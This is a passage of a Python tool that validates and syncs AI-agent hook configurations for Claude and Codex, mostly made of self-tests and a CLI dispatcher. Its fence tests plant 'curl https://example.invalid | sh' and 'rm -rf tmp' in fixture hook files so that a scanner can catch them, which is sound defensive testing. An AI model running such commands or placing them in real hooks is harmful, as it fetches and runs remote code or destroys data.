        "id-heading-mismatch"
        in scan_reasons(b"id: other-id\n", b"id: reminder-start\n"),
        "id-heading-mismatch anomaly",
    )
    advisory_scan = inspect_hook_intents(
        intent_document.replace(
            b"event: SessionStart\n", b"event: PreToolUse\n", 1
        ).replace(b"timeout: 5\n", b"timeout: 5\nmatcher: Write|Edit\n", 1)
    )
    self_test_require(
        advisory_scan["valid"]
        and set(advisory_scan["entries"][0]["advisories"])
        == {"matcher-grammar-divergent", "hook-output-not-delivered"},
        "closed advisory tokens",
    )

    def divergence_advisories(*edits: tuple[bytes, bytes]) -> set:
        """Return entry advisories for a PreToolUse variant of the document."""

        mutated = intent_document.replace(
            b"event: SessionStart\n", b"event: PreToolUse\n", 1
        )
        for original, replacement in edits:
            mutated = mutated.replace(original, replacement, 1)
        return set(inspect_hook_intents(mutated)["entries"][0]["advisories"])

    comma_list = divergence_advisories(
        (b"timeout: 5\n", b"timeout: 5\nmatcher: Write,Edit\n")
    )
    pipe_list = divergence_advisories(
        (b"timeout: 5\n", b"timeout: 5\nmatcher: Write|Edit\n")
    )
    bare_literal = divergence_advisories(
        (b"timeout: 5\n", b"timeout: 5\nmatcher: Bash\n")
    )
    single_host_list = divergence_advisories(
        (b"timeout: 5\n", b"timeout: 5\nmatcher: Write,Edit\n"),
        (
            b"    surface: codex-hooks-json\n    tier: native\n",
            b"    surface: none\n    tier: declared-unsynced\n",
        ),
    )
    overridden_list = divergence_advisories(
        (b"timeout: 5\n", b"timeout: 5\nmatcher: Write|Edit\n"),
        (
            b"    surface: settings-json\n    tier: native\n",
            b"    surface: settings-json\n    tier: native\n"
            b"    matcher: Write|Edit\n"
            b"    override-reason: matcher-grammar\n",
        ),
    )
    self_test_require(
        "matcher-grammar-divergent" in comma_list
        and "matcher-grammar-divergent" in pipe_list
        and "matcher-grammar-divergent" not in bare_literal
        and "matcher-grammar-divergent" not in single_host_list
        and "matcher-grammar-divergent" not in overridden_list,
        "matcher-grammar-divergent closed predicate: "
        f"{comma_list} {pipe_list} {bare_literal} "
        f"{single_host_list} {overridden_list}",
    )
    checks.append("matcher-grammar-divergent-predicate")
    unverified_scan = inspect_hook_intents(
        intent_document.replace(
            b"event: SessionStart\n", b"event: FutureEvent\n", 1
        ).replace(
            b"    surface: codex-hooks-json\n    tier: native\n",
            b"    surface: none\n    tier: declared-unsynced\n",
            1,
        )
    )
    unverified_entry = unverified_scan["entries"][0]
    self_test_require(
        unverified_scan["valid"]
        and not unverified_entry["event_verified"]
        and "event-unverified" in unverified_entry["advisories"],
        "unknown Claude event stays valid with event-unverified",
    )
    self_test_require(
        "tier-unsupported-event"
        in scan_reasons(b"event: FutureEvent\n", b"event: SessionStart\n"),
        "declared native Codex tier on a non-Codex event",
    )
    duplicate_document = intent_document + intent_document[
        intent_document.index(b"## hook: reminder-start") :
    ]
    duplicate_reasons = {
        anomaly["reason"]
        for anomaly in inspect_hook_intents(duplicate_document)["anomalies"]
    }
    self_test_require(
        "duplicate-id" in duplicate_reasons, "duplicate-id anomaly"
    )
    checks.append("hook-intent-scan-anomalies")

    stray_scan = inspect_hook_intents(
        intent_document.replace(
            b"## hook: reminder-start\n",
            b"```yaml\nid: preamble-stray\n```\n\n"
            b"## hook: reminder-start\n",
            1,
        )
    )
    self_test_require(
        not stray_scan["valid"]
        and stray_scan["shared_execution"]["present"]
        and stray_scan["entries"][0]["valid"]
        and stray_scan["anomalies"]
        == [{"reason": "yaml-block-count", "entry": None, "line": 5}],
        f"stray preamble yaml block anomaly: {stray_scan['anomalies']}",
    )
    unclosed_scan = inspect_hook_intents(
        intent_document.replace(
            b"## hook: reminder-start\n",
            b"```yaml\n\n## hook: reminder-start\n",
            1,
        )
    )
    self_test_require(
        any(
            anomaly["reason"] == "yaml-block-count"
            and anomaly["entry"] is None
            and anomaly["line"] == 5
            for anomaly in unclosed_scan["anomalies"]
        ),
        f"unclosed preamble yaml fence anomaly: {unclosed_scan['anomalies']}",
    )
    checks.append("hook-intent-preamble-stray-block")

    opt_in_scan = inspect_hook_intents(
        intent_document.replace(b"class: reminder\n", b"class: gate\n", 1)
    )
    opt_in_entry = opt_in_scan["entries"][0]
    self_test_require(
        opt_in_scan["valid"]
        and not opt_in_scan["anomalies"]
        and opt_in_entry["valid"]
        and opt_in_entry["opt_in_pending"]
        and opt_in_entry["lints"] == ["enabled-by-missing"]
        and len(opt_in_entry["authenticated"]) == 2,
        f"enabled-by-missing never invalidates an entry: {opt_in_scan}",
    )
    covered_scan = inspect_hook_intents(
        intent_document.replace(
            b"class: reminder\n", b"class: gate\n", 1
        ).replace(
            b"timeout: 5\n",
            b"timeout: 5\nenabled-by:\n  - date: 2026-09-07\n"
            b"    note: reviewed the exact command line\n",
            1,
        )
    )
    covered_entry = covered_scan["entries"][0]
    self_test_require(
        covered_scan["valid"]
        and not covered_entry["opt_in_pending"]
        and not covered_entry["lints"],
        f"a covering enabled-by record clears the lint: {covered_scan}",
    )
    self_test_require(
        "enabled-by-malformed"
        in scan_reasons(
            b"class: gate\nenabled-by:\n  - date: 2026-09-07\n",
            b"class: reminder\n",
        ),
        "enabled-by-malformed still invalidates an entry",
    )
    self_test_require(
        set(NON_INVALIDATING_INTENT_LINTS)
        <= set(INTENT_DOC_ANOMALY_REASONS),
        "non-invalidating lints stay inside the closed reason registry",
    )
    checks.append("hook-intent-non-invalidating-lints")

    for malformed in (
        b"class: gate\nenabled-by:\n  - date: 2026-02-31\n"
        b"    note: reviewed the exact command line\n",
        b"class: gate\nenabled-by:\n  - date: banana\n"
        b"    note: reviewed the exact command line\n",
        b"class: gate\nenabled-by:\n  - date: 2026-09-07\n"
        b'    note: " reviewed the exact command line"\n',
        b"class: gate\nenabled-by:\n  - date: 2026-09-07\n"
        b"    note: first review\n  - date: 2026-09-06\n"
        b"    note: second review\n",
    ):
        self_test_require(
            "enabled-by-malformed"
            in scan_reasons(malformed, b"class: reminder\n"),
            f"malformed enabled-by record: {malformed!r}",
        )
    self_test_require(
        not scan_reasons(
            b"class: gate\nenabled-by:\n  - date: 2026-09-06\n"
            b"    note: first review\n  - date: 2026-09-07\n"
            b"    note: second review\n",
            b"class: reminder\n",
        ),
        "two complete oldest-first enabled-by records stay valid",
    )
    self_test_require(
        "field-invalid"
        in scan_reasons(
            b"  - date: 2026-13-45\n", b"  - date: 2026-09-07\n"
        ),
        "an intent record with an impossible date is field-invalid",
    )
    checks.append("hook-intent-record-grammar")

    impossible_ack_scan = inspect_hook_intents(
        intent_document.replace(
            b"bridge:hooks-shared-execution 2026-09-07",
            b"bridge:hooks-shared-execution 2026-13-45",
            1,
        )
    )
    self_test_require(
        impossible_ack_scan["valid"]
        and not impossible_ack_scan["shared_execution"]["present"]
        and [item["reason"] for item in impossible_ack_scan["lints"]]
        == ["shared-execution-unacknowledged"],
        "an impossible acknowledgement date is no acknowledgement: "
        f"{impossible_ack_scan['shared_execution']}",
    )
    checks.append("hook-acknowledgement-calendar-date")

    claude_only_document = intent_document.replace(
        b"  codex:\n    surface: codex-hooks-json\n    tier: native\n",
        b"  codex:\n    surface: none\n    tier: declared-unsynced\n",
        1,
    )

    def matcher_reasons(document: bytes, anchor: bytes, matcher: bytes) -> set:
        mutated = document.replace(
            anchor, anchor + b"matcher: " + matcher + b"\n", 1
        )
        return {
            anomaly["reason"]
            for anomaly in inspect_hook_intents(mutated)["anomalies"]
        }

    self_test_require(
        "matcher-domain"
        in matcher_reasons(
            claude_only_document, b"timeout: 5\n", b"startup,bogus"
        )
        and "matcher-domain"
        in matcher_reasons(
            claude_only_document, b"timeout: 5\n", b"startup|bogus"
        )
        and not matcher_reasons(
            claude_only_document, b"timeout: 5\n", b"startup, resume"
        )
        and not matcher_reasons(
            claude_only_document, b"timeout: 5\n", b"startup"
        )
        and not matcher_reasons(
            claude_only_document, b"timeout: 5\n", b"^start.*"
        ),
        "a Claude list matcher is checked element by element",
    )
    codex_end_document = intent_document.replace(
        b"event: SessionStart\n", b"event: SessionEnd\n", 1
    ).replace(b"timeout: 5\n", b"timeout: 2\n", 1)
    self_test_require(
        "matcher-domain"
        in matcher_reasons(
            codex_end_document, b"timeout: 2\n", b"other-x"
        )
        and not matcher_reasons(
            codex_end_document, b"timeout: 2\n", b"other"
        ),
        "a hyphenated Codex literal outside the closed domain is caught",
    )
    checks.append("hook-matcher-domain-lists")

    first_duplicate_scan = inspect_hook_intents(duplicate_document)
    duplicate_lines = [
        anomaly["line"]
        for anomaly in first_duplicate_scan["anomalies"]
        if anomaly["reason"] == "duplicate-id"
    ]
    self_test_require(
        duplicate_lines
        == [
            duplicate_document[
                : duplicate_document.index(b"## hook:")
            ].count(b"\n")
            + 1,
            duplicate_document[
                : duplicate_document.rindex(b"## hook:")
            ].count(b"\n")
            + 1,
        ],
        f"each duplicate-id anomaly cites its own heading: {duplicate_lines}",
    )
    checks.append("hook-duplicate-id-first-line")

    wrapped_document = intent_document.replace(
        b"- Purpose: state the branch.\n",
        b"- Purpose: state the branch that agent configuration changes\n"
        b"  land on\tbefore any\n"
        b"  configuration work begins.\n",
        1,
    )
    wrapped_scan = inspect_hook_intents(wrapped_document)
    wrapped_entry = wrapped_scan["entries"][0]
    wrapped_bullet = wrapped_entry["bullets"][1]
    self_test_require(
        wrapped_scan["valid"]
        and wrapped_bullet["label"] == "Purpose"
        and wrapped_bullet["text"]
        == (
            "state the branch that agent configuration changes land on\t"
            "before any configuration work begins."
        ),
        f"wrapped bullet folds to one line: {wrapped_bullet}",
    )
    self_test_require(
        wrapped_document[
            wrapped_bullet["span"]["start"] : wrapped_bullet["span"]["end"]
        ]
        == b"- Purpose: state the branch that agent configuration changes\n"
        b"  land on\tbefore any\n"
        b"  configuration work begins.\n",
        "wrapped bullet span covers every continuation line",
    )
    self_test_require(
        render_hook_degradation(
            {
                "id": "wrapped-note",
                "event": "InstructionsLoaded",
                "class": "reminder",
                "bullets": wrapped_entry["bullets"],
            }
        ).count(b"\n- Purpose: ")
        == 1,
        "a folded bullet renders one hd1 line",
    )
    stopped_scan = inspect_hook_intents(
        intent_document.replace(
            b"- Purpose: state the branch.\n",
            b"- Purpose: state the branch.\n  still the purpose.\n",
            1,
        ).replace(
            b"- Command: print the branch name.\n",
            b"\n- Command: print the branch name.\n",
            1,
        )
    )
    self_test_require(
        stopped_scan["valid"]
        and stopped_scan["entries"][0]["bullets"][1]["text"]
        == "state the branch. still the purpose."
        and stopped_scan["entries"][0]["bullets"][2]["text"]
        == "print the branch name.",
        "a blank line ends a wrapped bullet",
    )
    checks.append("hook-intent-bullet-folding")

    declared_handler = {
        "type": "command",
        "command": "bridge-fixture-noop guard",
        "timeout": 5,
    }
    self_test_require(
        compare_hook_handler(
            declared_handler,
            dict(declared_handler),
            host="claude",
            event="PreToolUse",
        )["classification"]
        == "identical",
        "identical handler classification",
    )
    passthrough_result = compare_hook_handler(
        declared_handler,
        dict(declared_handler, additionalContextLimit=100),
        host="codex",
        event="PreToolUse",
    )
    self_test_require(
        passthrough_result["classification"] == "passthrough-only"
        and passthrough_result["equal"]
        and passthrough_result["passthrough_keys"]
        == ["additionalContextLimit"],
        "passthrough-only handler classification",
    )
    windows_result = compare_hook_handler(
        dict(declared_handler, commandWindows="bridge-fixture-noop win"),
        dict(declared_handler, commandWindows="bridge-fixture-noop old"),
        host="codex",
        event="PreToolUse",
    )
    self_test_require(
        windows_result["classification"] == "commandWindows-only"
        and windows_result["codex_identity_changed"] is False,
        "commandWindows-only keeps the Codex trust identity",
    )
    identity_result = compare_hook_handler(
        dict(declared_handler, timeout=30),
        declared_handler,
        host="codex",
        event="PreToolUse",
    )
    self_test_require(
        identity_result["classification"] == "identity-change"
        and identity_result["codex_identity_changed"] is True
        and identity_result["codex_identity_diff"] == ["timeout"],
        "identity-field change requires re-trust",
    )
    self_test_require(
        compare_hook_handler(
            dict(declared_handler, timeout=5),
            dict(declared_handler, timeout=3),
            host="codex",
            event="SessionEnd",
        )["codex_identity_changed"]
        is False,
        "Codex SessionEnd timeout clamp before hashing",
    )
    semantics_result = compare_hook_handler(
        declared_handler,
        dict(declared_handler, **{"async": True}),
        host="claude",
        event="PreToolUse",
    )
    self_test_require(
        semantics_result["classification"] == "semantics-divergent"
        and not semantics_result["equal"],
        "semantics-changing key is never passthrough",
    )
    foreign_result = compare_hook_handler(
        declared_handler,
        {"type": "mcp_tool"},
        host="codex",
        event="PreToolUse",
    )
    self_test_require(
        foreign_result["foreign_type"]
        and foreign_result["never_project_type"]
        and not compare_hook_handler(
            declared_handler,
            {"type": "future_handler"},
            host="codex",
        )["never_project_type"],
        "foreign handler type classification",
    )
    self_test_require(
        compare_hook_handler(
            declared_handler, None, host="claude"
        )["classification"]
        == "absent",
        "absent handler classification",
    )
    self_test_require(
        compare_hook_handler(
            declared_handler,
            dict(declared_handler, commandWindows="x"),
            host="claude",
            event="PreToolUse",
        )["extra_keys"]
        == ["commandWindows"],
        "a Claude commandWindows key stays undeclared",
    )
    checks.append("hook-handler-comparison")

    degradation_entry = {
        "id": "context-note",
        "event": "InstructionsLoaded",
        "class": "reminder",
        "bullets": {
            "Trigger": "when instructions load.",
            "Purpose": "restate the branch policy.",
            "Command": "print the branch policy.",
            "Environment": "no tools required.",
            "Failure policy": "advisory only.",
        },
    }
    degradation_body = render_hook_degradation(degradation_entry)
    self_test_require(
        degradation_body.startswith(b"# Hook intent: context-note\n")
        and b"- Trigger: when instructions load.\n" in degradation_body
        and degradation_body == normalize_n(degradation_body),
        "hd1 degradation block render",
    )
    self_test_expect_value_error(
        lambda: render_hook_degradation(
            dict(degradation_entry, **{"class": "gate"})
        ),
        "degradation of a gate class",
    )
    self_test_expect_value_error(
        lambda: render_hook_degradation(
            dict(degradation_entry, event="Stop")
        ),
        "degradation of a natively supported Codex event",
    )
    checks.append("hook-degradation-render")

    hook_block_agents = (
        b"<!-- bridge:managed:start id=hooks/context-note"
        b" source=.claude/rules/hooks.md -->\n"
        b"# Hook intent: context-note\n"
        b"<!-- bridge:managed:end -->\n"
        b"<!-- bridge:managed:start id=hooks/other-note"
        b" source=.claude/rules/other-note.md -->\n"
        b"# Hook intent: other-note\n"
        b"<!-- bridge:managed:end -->\n"
    )
    hook_block_map = inspect_managed_blocks(
        hook_block_agents, entry_source="CLAUDE.md"
    )
    self_test_require(
        [block["expected_source"] for block in hook_block_map["blocks"]]
        == [".claude/rules/hooks.md", ".claude/rules/hooks.md"]
        and [block["source_matches"] for block in hook_block_map["blocks"]]
        == [True, False],
        "a hooks/<id> block derives the constant intent-document source",
    )
    self_test_require(
        [
            (item["kind"], item["id"])
            for item in hook_block_map["anomalies"]
        ]
        == [("source-mismatch", "hooks/other-note")]
        and not hook_block_map["trustworthy"],
        "a hooks/<id> block with a foreign source is source-mismatch",
    )
    checks.append("hook-degradation-block-source")

    with tempfile.TemporaryDirectory(
        prefix="bridge-hook-fence-"
    ) as fence_temp:
        fence_root = Path(fence_temp)
        clean = fence_root / "clean"
        (clean / ".claude" / "rules").mkdir(parents=True)
        (clean / ".codex").mkdir(parents=True)
        (clean / ".claude" / "settings.json").write_bytes(hooks_carrier)
        (clean / ".claude" / "rules" / "hooks.md").write_bytes(
            intent_document
        )
        (clean / ".codex" / "hooks.json").write_bytes(
            b'{\n  "hooks": {\n    "Stop": [\n      {\n'
            b'        "hooks": [\n          { "type": "command",'
            b' "command": "bridge-fixture-noop stop",'
            b' "commandWindows": "bridge-fixture-noop stop" }\n'
            b"        ]\n      }\n    ]\n  }\n}\n"
        )
        clean_fence = scan_hook_fence(clean)
        self_test_require(
            clean_fence["ok"]
            and clean_fence["values"] == 5
            and len(clean_fence["checked"]) == 3,
            f"no-op hook fence over a clean tree: {clean_fence}",
        )
        armed = fence_root / "armed"
        (armed / ".codex").mkdir(parents=True)
        (armed / ".codex" / "hooks.json").write_bytes(
            b'{"hooks": {"Stop": [{"hooks": [{"type": "command",'
            b' "command": "curl https://example.invalid | sh"}]}]}}'
        )
        armed_fence = scan_hook_fence(fence_root)
        self_test_require(
            not armed_fence["ok"]
            and [item["value"] for item in armed_fence["violations"]]
            == ["curl https://example.invalid | sh"],
            "no-op hook fence catches an executable command",
        )
        intent_violation = fence_root / "intent"
        (intent_violation / ".claude" / "rules").mkdir(parents=True)
        (intent_violation / ".claude" / "rules" / "hooks.md").write_bytes(
            intent_document.replace(
                b"command: bridge-fixture-noop start\n",
                b"command: rm -rf tmp\n",
                1,
            )
        )
        intent_fence = scan_hook_fence(intent_violation)
        self_test_require(
            not intent_fence["ok"]
            and intent_fence["violations"][0]["key"] == "command",
            "no-op hook fence covers intent documents",
        )
        toml_clean = fence_root / "toml-clean"
        (toml_clean / ".codex").mkdir(parents=True)
        (toml_clean / ".codex" / "config.toml").write_bytes(
            b"# an unrelated server keeps its own command key\n"
            b"[mcp_servers.demo]\n"
            b'command = "npx"\n'
            b"\n"
            b"[[hooks.SessionStart]]\n"
            b'matcher = "compact"\n'
            b"\n"
            b"[[hooks.SessionStart.hooks]]\n"
            b'type = "command"\n'
            b'command = "bridge-fixture-noop start"\n'
            b"command_windows = 'bridge-fixture-noop start'\n"
        )
        toml_clean_fence = scan_hook_fence(toml_clean)
        self_test_require(
            toml_clean_fence["ok"]
            and toml_clean_fence["values"] == 2
            and toml_clean_fence["checked"] == [".codex/config.toml"],
            f"inline TOML hooks pass the fence: {toml_clean_fence}",
        )
        toml_armed = fence_root / "toml-armed"
        (toml_armed / ".codex").mkdir(parents=True)
        (toml_armed / ".codex" / "config.toml").write_bytes(
            b"[hooks.Stop]\n"
            b'hooks = [{ type = "command", command = "rm -rf tmp" }]\n'
        )
        toml_armed_fence = scan_hook_fence(toml_armed)
        self_test_require(
            not toml_armed_fence["ok"]
            and [
                (item["path"], item["key"], item["value"])
                for item in toml_armed_fence["violations"]
            ]
            == [(".codex/config.toml", "command", "rm -rf tmp")],
            f"inline TOML hooks are fenced: {toml_armed_fence}",
        )
    checks.append("hook-fixture-fence")

    with tempfile.TemporaryDirectory(
        prefix="bridge-activation-v2-"
    ) as activation_temp:
        activation_root = Path(activation_temp)
        profile_body = {
            "version": "activation-fixture/v2",
            "root_markers": [".git"],
            "fallback_filenames": [],
            "project_doc_max_bytes": 32768,
            "budget_source": "resolved",
            "codex_project_trust": "unknown",
            "codex_hooks_feature": "unknown",
        }
        valid_profile = activation_root / "valid.json"
        valid_profile.write_text(
            json.dumps(profile_body) + "\n", encoding="utf-8"
        )
        validated = validate_activation_profile(valid_profile)
        self_test_require(
            validated["contract"] == "activation-fixture/v2"
            and validated["profile"]["codex_project_trust"] == "unknown"
            and validated["profile"]["codex_hooks_feature"] == "unknown",
            "activation-fixture/v2 accepts the unknown live inputs",
        )
        for mutation in (
            {"codex_project_trust": "maybe"},
            {"codex_hooks_feature": "on"},
            {"version": "activation-fixture/v1"},
        ):
            broken = activation_root / "broken.json"
            broken.write_text(
                json.dumps(dict(profile_body, **mutation)) + "\n",
                encoding="utf-8",
            )
            self_test_expect_value_error(
                lambda path=broken: validate_activation_profile(path),
                f"activation profile mutation {sorted(mutation)}",
            )
        missing = activation_root / "missing.json"
        missing_body = dict(profile_body)
        del missing_body["codex_hooks_feature"]
        missing.write_text(
            json.dumps(missing_body) + "\n", encoding="utf-8"
        )
        self_test_expect_value_error(
            lambda: validate_activation_profile(missing),
            "activation profile without codex_hooks_feature",
        )
    checks.append("activation-profile-v2-fields")

    live_only = {"codex-project-untrusted", "codex-hooks-feature-disabled"}
    self_test_require(
        live_only <= LIVE_ACTIVATION_OBSERVATIONS,
        "report/v5 live activation inputs stay in the filtered set",
    )
    environment_dependent = expectation_activation_profile(
        Path("expected-report.md"),
        ["- activation profile: environment-dependent"],
    )
    self_test_require(
        environment_dependent["mode"] == "environment-dependent"
        and live_only <= set(environment_dependent["filtered_observations"]),
        "environment-dependent expectations strip the live Codex hook lines",
    )
    checks.append("live-activation-observation-registry")

    return {"pass": True, "checks": checks}



def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Read-only byte and Git-tree mechanics for Bridge skills."
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    files = subparsers.add_parser("compare-files")
    files.add_argument("source", type=Path)
    files.add_argument("projection", type=Path)
    files.add_argument("--normalize-n", action="store_true")

    agents = subparsers.add_parser("inspect-agents-md")
    agents.add_argument("path", type=Path)
    agents.add_argument("--entry-source")
    agents.add_argument("--owned-id", action="append", default=[])

    render = subparsers.add_parser("render-agents-unit")
    render.add_argument("source", type=Path)
    render.add_argument(
        "--kind", choices=("entry", "rule", "covenant"), required=True
    )
    render.add_argument(
        "--paths-json",
        help=(
            "ordered JSON string list already validated against v4 paths "
            "and brace-expansion limits"
        ),
    )

    imports = subparsers.add_parser("inspect-active-imports")
    imports.add_argument("source", type=Path)

    preamble = subparsers.add_parser("parse-preamble")
    preamble.add_argument("path", type=Path)

    paths = subparsers.add_parser("validate-render-paths")
    paths.add_argument("paths_json")

    budget = subparsers.add_parser("check-agents-budget")
    budget.add_argument("path", type=Path)
    budget.add_argument("--budget", type=int, required=True)

    trees = subparsers.add_parser("compare-trees")
    trees.add_argument("master", type=Path)
    trees.add_argument("copy", type=Path)

    manifest = subparsers.add_parser("git-manifest")
    manifest.add_argument("repository", type=Path)
    manifest.add_argument("unit")
    manifest.add_argument("--revision")
    manifest.add_argument("--include-untracked", action="store_true")
    manifest.add_argument("--require-executable", action="append", default=[])

    git_trees = subparsers.add_parser("compare-git-trees")
    git_trees.add_argument("repository", type=Path)
    git_trees.add_argument("source_unit")
    git_trees.add_argument("projection_unit")
    git_trees.add_argument("--revision")
    git_trees.add_argument("--include-untracked", action="store_true")
    git_trees.add_argument(
        "--direction",
        choices=sorted(GIT_TREE_DIRECTIONS),
        default="observe",
    )
    git_trees.add_argument(
        "--require-executable", action="append", default=[]
    )

    expectation = subparsers.add_parser("compare-expectation")
    expectation.add_argument("produced", type=Path)
    expectation.add_argument("expected", type=Path)

    activation = subparsers.add_parser("validate-activation-profile")
    activation.add_argument("path", type=Path)

    inspect = subparsers.add_parser("inspect-tree")
    inspect.add_argument("root", type=Path)

    carrier = subparsers.add_parser("inspect-hooks-json")
    carrier.add_argument("--file", type=Path, required=True)
    carrier.add_argument("--host", choices=("claude", "codex"))

    span = subparsers.add_parser("locate-json-span")
    span.add_argument("--file", type=Path, required=True)
    span.add_argument("--event", required=True)
    span.add_argument("--host", choices=("claude", "codex"))
    span.add_argument("--require-existing", action="store_true")
    selector = span.add_mutually_exclusive_group(required=True)
    selector.add_argument("--matcher")
    selector.add_argument("--no-matcher", action="store_true")

    group = subparsers.add_parser("render-hook-group")
    group.add_argument("--entry-json", type=Path, required=True)
    group.add_argument("--host", choices=("claude", "codex"), required=True)
    group.add_argument("--style", required=True)
    group.add_argument("--passthrough")
    group.add_argument("--creating", action="store_true")

    compose = subparsers.add_parser("compose-hooks-json")
    compose.add_argument("--file", type=Path, required=True)
    compose.add_argument("--desired", required=True)

    intents = subparsers.add_parser("inspect-hook-intents")
    intents.add_argument("--file", type=Path, required=True)

    handler = subparsers.add_parser("compare-hook-handler")
    handler.add_argument("--declared", required=True)
    handler.add_argument("--actual", required=True)
    handler.add_argument(
        "--host", choices=("claude", "codex"), required=True
    )
    handler.add_argument("--event")

    degradation = subparsers.add_parser("render-hook-degradation")
    degradation.add_argument("--entry-json", type=Path, required=True)

    subparsers.add_parser("self-test")
    return parser



def _decode_cli_json(raw: str, label: str) -> Any:
    try:
        return json.loads(raw)
    except json.JSONDecodeError as error:
        raise ValueError(f"{label} must decode as JSON: {error}") from error



def _rendered_payload(rendered: bytes) -> dict[str, Any]:
    return {
        "bytes": len(rendered),
        "sha256": hashlib.sha256(rendered).hexdigest(),
        "base64": base64.b64encode(rendered).decode("ascii"),
        "text": rendered.decode("utf-8"),
    }



def main() -> int:
    args = build_parser().parse_args()
    try:
        if args.command == "compare-files":
            result = compare_files(args.source, args.projection, args.normalize_n)
            success = result["equal"]
        elif args.command == "inspect-agents-md":
            result = inspect_managed_blocks(
                args.path.read_bytes(),
                entry_source=args.entry_source,
                owned_ids=args.owned_id,
            )
            result["path"] = str(args.path)
            success = result["trustworthy"]
        elif args.command == "render-agents-unit":
            paths_value: Optional[list[str]] = None
            if args.paths_json is not None:
                parsed_paths = json.loads(args.paths_json)
                if not isinstance(parsed_paths, list):
                    raise ValueError("--paths-json must decode to a list")
                paths_value = parsed_paths
            result = render_agents_unit(
                args.source.read_bytes(),
                kind=args.kind,
                paths=paths_value,
            )
            result["source"] = str(args.source)
            success = result["valid"]
        elif args.command == "inspect-active-imports":
            found = active_imports(args.source.read_bytes())
            result = {
                "contract": "active-import-scan/v1",
                "source": str(args.source),
                "blocked": bool(found),
                "imports": found,
            }
            success = not found
        elif args.command == "parse-preamble":
            result = parse_preamble(args.path.read_bytes())
            result["path"] = str(args.path)
            success = result["valid"]
        elif args.command == "validate-render-paths":
            parsed_paths = json.loads(args.paths_json)
            errors = validate_render_paths(parsed_paths)
            result = {
                "contract": "render-paths-check/v1",
                "valid": not errors,
                "errors": errors,
            }
            success = not errors
        elif args.command == "check-agents-budget":
            result = check_agents_budget(
                args.path.read_bytes(), args.budget
            )
            result["path"] = str(args.path)
            success = result["fits"]
        elif args.command == "compare-trees":
            result = compare_trees(args.master, args.copy)
            success = result["equal"]
        elif args.command == "git-manifest":
            result = git_manifest(
                args.repository,
                args.unit,
                revision=args.revision,
                include_untracked=args.include_untracked,
                required_executable=args.require_executable,
            )
            success = result["safe"]
        elif args.command == "compare-git-trees":
            result = compare_git_trees(
                args.repository,
                args.source_unit,
                args.projection_unit,
                revision=args.revision,
                include_untracked=args.include_untracked,
                direction=args.direction,
                required_executable=args.require_executable,
            )
            success = result["equal"]
        elif args.command == "compare-expectation":
            result = compare_expectations(args.produced, args.expected)
            success = result["pass"]
        elif args.command == "validate-activation-profile":
            result = validate_activation_profile(args.path)
            success = True
        elif args.command == "inspect-tree":
            result = inspect_tree(args.root)
            success = result["safe"]
        elif args.command == "inspect-hooks-json":
            result = inspect_hooks_json(
                args.file.read_bytes(), host=args.host
            )
            result["path"] = str(args.file)
            success = result["ok"]
        elif args.command == "locate-json-span":
            try:
                carrier_bytes = args.file.read_bytes()
            except OSError:
                result = {
                    "contract": JSON_SPAN_SPEC,
                    "ok": False,
                    "event": args.event,
                    "matcher": args.matcher,
                    "reason": "carrier-absent",
                }
            else:
                result = locate_json_span(
                    carrier_bytes,
                    event=args.event,
                    matcher=args.matcher,
                    host=args.host,
                    require_existing=args.require_existing,
                )
            result["path"] = str(args.file)
            success = result["ok"]
        elif args.command == "render-hook-group":
            rendered = render_hook_group(
                _decode_cli_json(
                    args.entry_json.read_text(encoding="utf-8"),
                    "--entry-json",
                ),
                host=args.host,
                style=_decode_cli_json(args.style, "--style"),
                creating=args.creating,
                passthrough=(
                    None
                    if args.passthrough is None
                    else _decode_cli_json(
                        args.passthrough, "--passthrough"
                    )
                ),
            )
            result = {
                "contract": HOOK_GROUP_RENDER_SPEC,
                "host": args.host,
                "creating": args.creating,
                "rendered": _rendered_payload(rendered),
            }
            success = True
        elif args.command == "compose-hooks-json":
            result = compose_hooks_json(
                args.file.read_bytes(),
                _decode_cli_json(args.desired, "--desired"),
            )
            result["path"] = str(args.file)
            success = True
        elif args.command == "inspect-hook-intents":
            result = inspect_hook_intents(args.file.read_bytes())
            result["path"] = str(args.file)
            success = result["valid"]
        elif args.command == "compare-hook-handler":
            declared = _decode_cli_json(args.declared, "--declared")
            actual = _decode_cli_json(args.actual, "--actual")
            result = compare_hook_handler(
                declared, actual, host=args.host, event=args.event
            )
            success = True
        elif args.command == "render-hook-degradation":
            entry = _decode_cli_json(
                args.entry_json.read_text(encoding="utf-8"), "--entry-json"
            )
            result = {
                "contract": HOOK_DEGRADATION_RENDER_SPEC,
                "template": HOOK_DEGRADATION_TEMPLATE,
                "id": entry.get("id") if isinstance(entry, dict) else None,
                "rendered": _rendered_payload(
                    render_hook_degradation(entry)
                ),
            }
            success = True
        else:
            result = run_self_test()
            success = result["pass"]
    except (OSError, UnicodeError, ValueError) as error:
        print(json.dumps({"error": str(error)}, ensure_ascii=False, indent=2))
        return 2

    print(json.dumps(result, ensure_ascii=False, indent=2))
    return 0 if success else 1


if __name__ == "__main__":
    raise SystemExit(main())
